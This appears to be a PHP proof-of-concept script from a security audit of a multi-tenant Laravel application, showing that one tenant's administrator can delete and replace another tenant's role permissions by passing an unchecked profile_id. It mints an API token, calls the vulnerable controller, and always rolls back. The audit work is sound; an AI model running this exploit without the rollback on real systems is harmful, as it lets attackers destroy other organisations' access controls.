<?php
/**
 * F-150 EVIDENCE — one tenant's admin can destroy another tenant's permissions.
 *
 * storeGroupwiseRightsG2g takes `profile_id` VERBATIM from the request and never
 * checks it belongs to the caller's organisation. Menu ids ARE validated
 * (visibleToTenant), which makes the omission look deliberate rather than
 * forgotten. The delete is `where('profile_id', $profile_id)->delete()` with no
 * tenant clause, and the re-inserted rows are stamped with the CALLER's tenant.
 *
 * So a tenant-A admin can: wipe tenant B's role permissions, replace them with
 * whatever they choose, and leave the rows claiming to belong to tenant A.
 *
 * Everything below runs inside ONE transaction and is ALWAYS rolled back.
 *
 *   php artisan tinker --execute="require getcwd().'/Docs/organization-audit/_evidence/prove-rights-hijack.php';"
 */
DB::setDefaultConnection('mysql');
$db = DB::connection('mysql');

$attackerTenant = 1;
$victimTenant = 6;

$victimProfile = $db->table('tbluserprofilemaster')
    ->where('sub_institute_id', $victimTenant)
    ->where('role_key', 'administrator')
    ->first(['id', 'name']);

$attacker = $db->table('tbluser')
    ->where('sub_institute_id', $attackerTenant)
    ->whereIn('user_profile_id', function ($q) use ($attackerTenant) {
        $q->select('id')->from('tbluserprofilemaster')
          ->where('sub_institute_id', $attackerTenant)
          ->where('role_key', 'administrator');
    })
    ->first(['id', 'first_name']);

if (!$victimProfile || !$attacker) {
    echo "Could not find an administrator on both tenants.\n";
    return;
}

$before = $db->table('tblgroupwise_rights_g2g')->where('profile_id', $victimProfile->id)->count();

printf("Victim:   tenant %d, profile #%d (%s) — holds %d rights rows\n",
    $victimTenant, $victimProfile->id, $victimProfile->name, $before);
printf("Attacker: tenant %d, user #%d (%s), an ordinary administrator OF THEIR OWN TENANT\n\n",
    $attackerTenant, $attacker->id, $attacker->first_name);

$user = \App\Models\auth\tbluserModel::find($attacker->id);
$token = $user->createToken('hijack-evidence')->plainTextToken;

DB::beginTransaction();

try {
    $request = \Illuminate\Http\Request::create('/x', 'POST', [
        'type' => 'API',
        'token' => $token,
        // Sent because the endpoint validates its presence. It is IGNORED for
        // tenancy - apiTenantId() overrides it from the token - which is
        // correct, and is exactly why the profile_id below is the hole.
        'sub_institute_id' => $attackerTenant,
        'syear' => date('Y'),
        // The ONLY thing that decides whose permissions are rewritten.
        'profile_id' => $victimProfile->id,
        'rights' => [
            ['menu_id' => 300, 'can_view' => 1],   // leave them one screen
        ],
    ]);
    $request->headers->set('Authorization', 'Bearer ' . $token);

    $response = app(\App\Http\Controllers\user\tblmenumasterG2gController::class)
        ->storeGroupwiseRightsG2g($request);

    printf("POST save_groupwiserights_g2g -> HTTP %d  %s\n",
        $response->getStatusCode(),
        json_decode($response->getContent(), true)['message'] ?? '');

    $after = $db->table('tblgroupwise_rights_g2g')->where('profile_id', $victimProfile->id)->count();
    $stamped = $db->table('tblgroupwise_rights_g2g')
        ->where('profile_id', $victimProfile->id)
        ->select('sub_institute_id', DB::raw('COUNT(*) c'))
        ->groupBy('sub_institute_id')->get();

    printf("\nVictim's rights rows: %d  ->  %d\n", $before, $after);
    foreach ($stamped as $row) {
        printf("   %d row(s) now stamped sub_institute_id = %s   %s\n",
            $row->c, var_export($row->sub_institute_id, true),
            (string) $row->sub_institute_id === (string) $attackerTenant ? "<- THE ATTACKER'S TENANT" : '');
    }

    printf("\n%s\n", $after < $before
        ? "RESULT: tenant {$victimTenant}'s administrator just lost " . ($before - $after) . " permissions to a caller from tenant {$attackerTenant}."
        : 'RESULT: rights were not destroyed.');
} finally {
    DB::rollBack();
    $user->tokens()->where('name', 'hijack-evidence')->delete();
    echo "\n(rolled back — the victim's real permissions are untouched)\n";
}
